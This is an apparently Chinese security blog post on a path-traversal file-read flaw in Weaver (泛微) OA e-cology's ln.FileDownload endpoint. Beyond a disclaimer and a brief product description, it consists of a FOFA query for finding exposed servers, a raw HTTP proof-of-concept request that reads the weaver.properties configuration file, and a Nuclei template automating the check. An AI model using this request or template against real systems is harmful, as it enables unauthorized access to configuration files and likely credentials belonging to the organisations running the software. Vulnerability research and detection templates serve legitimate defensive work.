#  泛微OA E-Cology ln.FileDownload 文件读取漏洞   
lcyunkong  云途安全   2024-05-11 15:41  
  
**0x00 阅读须知**  
  
****  
**免责声明：****本文提供的信息和方法仅供网络安全专业人员用于教学和研究目的，不得用于任何非法活动。读者若使用文章内容从事任何未授权的行为，需自行承担所有法律责任和后果。本公众号及作者对由此引起的任何直接或间接损失不负责任。请严格遵守相关法律法规。**  
###   
### 0x01 漏洞简介  
  
  
泛  
微e-cology是一款由  
泛微网络  
科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公解决方案。e-cology平台提供了一系列协同办公工具，包括在线办公应用、文档管理、任务管理、日程安排、电子邮件和即时通讯等  
。这个系统被发现存在文件读取漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYAQpLaxpAsTiaLG0Y7Tgic4COhyROsAdbANFzm0sgBt9dicyLjLJOyDaO4h6R5OfynkyI16ll3Sq1NA/640?wx_fmt=png&from=appmsg "")  
### 0x02 漏洞详情  
  
****  
**fofa：****app="泛微-OA（e-cology）"**  
  
****  
**Poc：**  
```
GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYAQpLaxpAsTiaLG0Y7Tgic4CYpJ7nXc4dISiazHGRJvjNsX8u7jFDDnYqqHUFalXwqFm8pQftbpgtYA/640?wx_fmt=png&from=appmsg "")  
  
**0x03 Nuclie**  
  
```
id: FanWeiOA_E-Cology-FileDownload-fileread

info:
  name: FanWeiOA_E-Cology-FileDownload-fileread
  author: yunkong
  severity: high
  description: 泛微OA E-Cology ln.FileDownload文件读取漏洞
  tags: tags

http:
  - raw:
      - |+
        GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1


    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - filename=weaver.properties.license
      - type: word
        part: body
        words:
          - ecology
      - type: status
        status:
          - 200
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYAQpLaxpAsTiaLG0Y7Tgic4C4S60NH2icn77otYUsG5j63WYlzUZ280RjqcLqn9YJRxebDo1PENlvpw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
